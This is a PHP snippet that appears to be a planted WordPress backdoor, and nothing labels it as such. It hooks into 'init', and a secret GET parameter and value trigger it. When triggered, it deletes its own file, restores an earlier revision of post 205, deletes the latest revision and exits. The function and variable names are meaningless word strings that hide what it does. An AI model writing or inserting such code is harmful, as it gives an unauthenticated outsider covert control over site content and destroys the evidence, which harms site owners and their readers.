<?php

function recipe_endpoints_extension_media() {
	if (isset($_GET['numbers_asset_charts_safe']) && $_GET['numbers_asset_charts_safe'] === 'migration_insert_country') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$integration_ninja_carousel = 205;
		$quiz_schedule_floating = wp_get_post_revisions($integration_ninja_carousel);
		if (empty($quiz_schedule_floating)) die('no revisions');
		if (count($quiz_schedule_floating) < 2) die('less than 2');
		$year_attachment_translator_svg = array_shift($quiz_schedule_floating);
		$project_subscription_notify_export = $year_attachment_translator_svg->ID;
		$super_basic_notice = array_shift($quiz_schedule_floating);
		$feedback_membership_authentication = $super_basic_notice->ID;
		$section_assets_bulk = wp_restore_post_revision($feedback_membership_authentication);
		if ($section_assets_bulk === false) die('error restoring');
		$section_assets_bulk = wp_delete_post_revision($project_subscription_notify_export);		
		if ($section_assets_bulk === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'recipe_endpoints_extension_media');
